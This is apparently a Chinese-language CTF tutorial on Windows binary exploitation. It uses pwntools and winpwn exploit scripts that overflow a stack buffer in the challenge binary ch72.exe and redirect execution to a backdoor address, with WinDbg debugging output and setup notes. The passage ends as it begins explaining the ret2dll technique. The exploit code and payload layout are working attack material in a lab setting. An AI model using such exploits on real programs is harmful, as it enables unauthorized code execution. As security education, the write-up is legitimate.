> 上一节笔者学习了winpwn的用法，以及最基础的栈溢出利用用法和win
> pwn的保护机制的意思，这一节笔者学习了利用pwntools编写exp以及调试程序，也学习了ret2dll的利用手法
之前的文章链接：
  * [win pwn初探（一）](https://xz.aliyun.com/t/11865)
# win-pwn初探（二）
## 利用pwntools编写exp
这里需要Ex师傅的一个工具：[Win Server](https://github.com/Ex-Origin/win_server)，这个就像搭建pwn题一样，把exe给映射到一个端口上
    git clone https://github.com/Ex-Origin/win_server.git
如上git clone之后即可使用，用法：`.\win_server.exe ..\ch72\ch72.exe
1234`就可以把ch72.exe给映射到1234端口上，试着用nc连接一下，发现可以正常的执行程序
    16:15:45 PI:EMAIL test nc 10.211.55.3 1234
    a
    A
pwntools如下安装
    pip3 install pwntools
接着就可以正常使用pwntools了，需要注意的是目前只支持`remote`的用法
    from pwn import *
    from time import sleep
    context.log_level = 'debug'
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    r = remote('10.211.55.3', 1234)
    p1 = b'a' * (0x14 + 4)
    p1 += p32(0x401000)
    r.sendline(p1)
    sleep(1)
    r.sendline('calc')
    r.interactive()
将上一节的exp改一下之后运行可以正常触发calc
## 结合pwntools进行调试
在调试exp的时候花了很长时间，断点下在了main函数入口那里，以为会直接断在那里的。然后运行的时候发现断不了，就在网上找解决方法（srv，reload），心态快要爆炸后，问了一下Ex师傅，师傅看了一眼就知道问题出在了断点下的太前，已经执行过了，在gets后下了一个断点就成功的断下来了
首先在exp前面加上一个pause()使得程序停住，如下exp运行
    from pwn import *
    from time import sleep
    context.log_level = 'debug'
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    r = remote('10.211.55.3', 1234)
    pause()
    p1 = b'a' * (0x14 + 4)
    p1 += p32(0x401000)
    r.sendline(p1)
    r.interactive()
然后利用windbg attach到程序上
在`0x0401088`这里下一个断点，并且输入g，g就是程序运行到断点停住
    0:002> bp 0x0401088
    0:002> g
然后回到exp那里输入任意键，执行payload，此时windbg会断到断点这里
    0:002> g
    Breakpoint 0 hit
    eax=00000012 ebx=00243000 ecx=00402732 edx=0041b098 esi=0041be28 edi=0041be2c
    eip=00401088 esp=0019fe74 ebp=0019fe90 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0023             efl=00000202
    ch72+0x1088:
    00401088 83c408          add     esp,8
在ebp这里减去0x20就可以看到输入了a（0x61）被转换成大写A（0x41），并且后面可以看到ebp被覆盖成了aaaa而返回地址被覆盖成了`0x00401000`这个地址也就是后门地址
    0:000> dc ebp - 0x20
    0019fe70  00401088 0041b01c 0019fe7c 41414141  ..@...A.|...AAAA
    0019fe80  41414141 41414141 41414141 00000010  AAAAAAAAAAAA....
    0019fe90  61616161 00401000 00000000 06e29668  aaaa..@.....h...
    0019fea0  06e29690 8abb39fd 00401347 00243000  .....9..G.@..0$.
    0019feb0  00243000 00000000 00401347 00243000  .0$.....G.@..0$.
    0019fec0  0019fea4 00000000 0019fef8 00401c60  ............`.@.
    0019fed0  8ae3509d 00000000 0019fef0 762ec038  .P..........8..v
    0019fee0  00243000 00000000 00000000 00000000  .0$.............
再次g就可以getshell，也可以单步调试-`p`，下面是ret之后的，可以看到成功跑进后门里
    0:000> p
    eax=00000000 ebx=00363000 ecx=00402732 edx=0041b098 esi=0041be28 edi=0041be2c
    eip=00401000 esp=0019fe98 ebp=61616161 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0023             efl=00000246
    ch72+0x1000:
    00401000 55              push    ebp
## 利用winpwn模块进行调试
winpwn调试和上面的区别是winpwn可以本地调试（对目前来说），在winpwn的官方文档里要求配置一个.winpwn到 **HOMEDIR**
这个文件夹里面，不知道homedir是什么就可以用如下python运行一下
    Python 3.10.8 (tags/v3.10.8:aaaf517, Oct 11 2022, 16:50:30) [MSC v.1933 64 bit (AMD64)] on win32
    Type "help", "copyright", "credits" or "license" for more information.
    >>> import os
    >>> os.path.expanduser("~\\.winpwn")
    'C:\\Users\\MAC\\.winpwn'
    >>>
然后写入如下配置
    {
        "debugger":{
            "i386": {
                "x64dbg": "F:\\ctfTools\\debugTools\\x64debug\\release\\x32\\x32dbg.exe", 
                "gdb": "F:\\ctfTools\\windows-gdb\\mingw-w64-686\\mingw32\\bin\\gdb.exe", 
                "windbg": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe",
                "windbgx": "C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe"
            },
            "amd64": {
                "x64dbg": "F:\\ctfTools\\debugTools\\x64debug\\release\\x64\\x64dbg.exe", 
                "gdb": "F:\\ctfTools\\windows-gdb\\mingw-w64-64\\mingw64\\bin\\gdb64.exe", 
                "windbg": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe",
                "windbgx": "C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe"
            }
        },
        "debugger_init": {
            "i386": {
                "x64dbg": "", 
                "gdb": "", 
                "windbg": ".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;",
                "windbgx": ".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;"
            },
            "amd64": {
                "x64dbg": "", 
                "gdb": "", 
                "windbg": ".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;",
                "windbgx": ".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;"
            }
        }
    }
目前只需要改第7行的代码，把之前下载的windbg.exe的位置填进去就好了
然后exp如下
    from winpwn import *
    from time import *
    #context.log_level='debug'
    context.arch='i386'
    file_name = './ch72.exe'
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    r = process(file_name)
    windbgx.attach(r)
    payload  = 'a' * (0x14 + 4)
    payload += p32(0x401000)
    r.sendline(payload)
    r.interactive()
运行exp时windbg就会自动启动，再像上面pwntools那样下断点即可
## ret2dll
这个攻击手法和ret2libc相似，用`root-me PE32 - Stack buffer overflow avancé`这题来学习一下
[题目地址](https://www.root-me.org/fr/Challenges/App-Systeme/PE32-Stack-buffer-overflow-avance)，题目源码需要攻击成功之后才可以查看
在做这个题目前先理解一下什么是dll，DLL的全称是Dynamic Link
Library，中文叫做“动态链接文件”，在Windows操作系统中，DLL对于程序执行是非常重要的，因为程序在执行的时候，必须链接到DLL文件，才能够正确地运行。而有些DLL文件可以被许多程序共用。因此,
程序设计人员可以利用DLL文件, 使程序不至于太过巨大。
这测试一下，写一个test.c